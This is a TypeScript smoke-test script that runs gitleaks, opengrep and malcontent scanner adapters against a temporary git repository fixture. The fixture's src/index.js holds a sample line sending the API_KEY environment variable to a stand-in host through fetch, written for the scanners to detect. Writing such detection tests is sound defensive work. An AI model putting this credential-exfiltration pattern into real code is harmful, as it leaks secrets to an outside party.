import { execFile } from "node:child_process";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";

import { safeCliErrorRecord } from "../src/cli/io.js";
import { loadScannerPins } from "../src/config/policy.js";
import { ProcessCommandRunner } from "../src/process/command-runner.js";
import { runGitleaks } from "../src/scanners/gitleaks.js";
import { runMalcontent } from "../src/scanners/malcontent.js";
import { runOpenGrep } from "../src/scanners/opengrep.js";
import { resolveToolsDirectory } from "./verify-scanners.mjs";

const execFileAsync = promisify(execFile);
const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), "..");

async function git(root: string, args: string[]) {
  return execFileAsync("git", args, {
    cwd: root,
    env: {
      PATH: process.env.PATH,
      GIT_CONFIG_NOSYSTEM: "1",
      GIT_TERMINAL_PROMPT: "0",
    },
    timeout: 30_000,
    windowsHide: true,
  });
}

async function main() {
  if (process.platform !== "linux" || process.arch !== "x64")
    throw new Error("Scanner adapter smoke testing requires Linux x64.");
  const pins = await loadScannerPins(
    join(repositoryRoot, "config", "scanners.v1.json"),
  );
  const toolsDir = resolveToolsDirectory();
  const fixture = await mkdtemp(join(tmpdir(), "tavernkeeper-scanner-smoke-"));
  try {
    await mkdir(join(fixture, "src"));
    await writeFile(
      join(fixture, "src", "index.js"),
      [
        "const credential = process.env.API_KEY;",
        'fetch("https://example.invalid/report", { body: credential });',
        "",
      ].join("\n"),
    );
    await writeFile(join(fixture, "src", "harmless.txt"), "hello tavern\n");
    await git(fixture, ["init", "--quiet"]);
    await git(fixture, ["config", "user.name", "TavernKeeper CI"]);
    await git(fixture, ["config", "user.email", "ci@invalid.example"]);
    await git(fixture, ["add", "--", "src/index.js", "src/harmless.txt"]);
    await git(fixture, ["commit", "--quiet", "-m", "scanner fixture"]);
    const targetSha = (await git(fixture, ["rev-parse", "HEAD"])).stdout.trim();
    const runner = new ProcessCommandRunner();

    const gitleaks = await runGitleaks({
      root: fixture,
      history: { baseSha: null, targetSha, commits: 1 },
      runner,
      executable: join(toolsDir, "bin", "gitleaks"),
      version: pins.gitleaks.version,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${gitleaks.name} (${gitleaks.findings.length} findings).\n`,
    );

    const rulesRoot = join(repositoryRoot, "rules", "opengrep");
    const opengrep = await runOpenGrep({
      root: fixture,
      rulesRoot,
      runner,
      executable: join(toolsDir, "bin", "opengrep"),
      version: pins.opengrep.version,
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${opengrep.name} (${opengrep.findings.length} findings).\n`,
    );

    const malcontent = await runMalcontent({
      root: fixture,
      inputs: [
        {
          path: "src/harmless.txt",
          bytes: 13,
          sha256: "0".repeat(64),
          kind: "text",
        },
      ],
      runner,
      executable: join(toolsDir, "bin", "malcontent"),
      version: pins.malcontent.version,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${malcontent.name} (${malcontent.findings.length} findings).\n`,
    );
  } finally {
    await rm(fixture, { recursive: true, force: true });
  }
}

if (process.argv[1] && resolve(process.argv[1]) === scriptPath) {
  main().catch((error: unknown) => {
    process.stderr.write(`${JSON.stringify(safeCliErrorRecord(error))}\n`);
    process.exitCode = 1;
  });
}
